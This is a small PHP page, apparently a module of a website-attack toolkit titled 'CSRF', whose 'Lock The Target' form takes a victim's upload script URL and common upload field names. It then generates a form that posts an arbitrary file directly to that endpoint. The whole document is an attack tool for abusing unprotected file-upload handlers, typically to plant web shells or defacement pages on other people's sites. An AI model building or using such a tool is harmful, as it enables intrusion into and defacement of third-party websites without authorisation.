<?php
$judul=@CSRF;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
          <table class="table table-bordered table-striped">
	
<tr>
	<td width="400" bgcolor="transparent">
<form method="post">
<font size="5px" color="white" face="teko" style="text-shadow: 1px 0px 5px white;">
URL: <input type="url" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" class="form-control text-primary" autocomplete="off" required>
<br>
POST FILE: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / uploadfile / dll" class="form-control text-primary" autocomplete="off" required></font>
<center><br>
<input type="submit" name="d" value="Lock The Target" class="btn btn-outline-primary">
		<br>
</center></form></i>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
$pf =htmlspecialchars($pf);
$url =htmlspecialchars($url);
if($d) {
	echo "<center><font color='red'> $url  Status -> </font> <font color='green'> Locked</font> </center>";
    echo "<center><form method='post'  target='_blank' action='$url' enctype='multipart/form-data' >
<label class='custom-file'>
<input type='file' name='$pf'/>
<input type='submit' name='d' value='Go!' class='btn btn-outline-primary' ></center></form"; 
}
?>
<br/></tr>
	</table>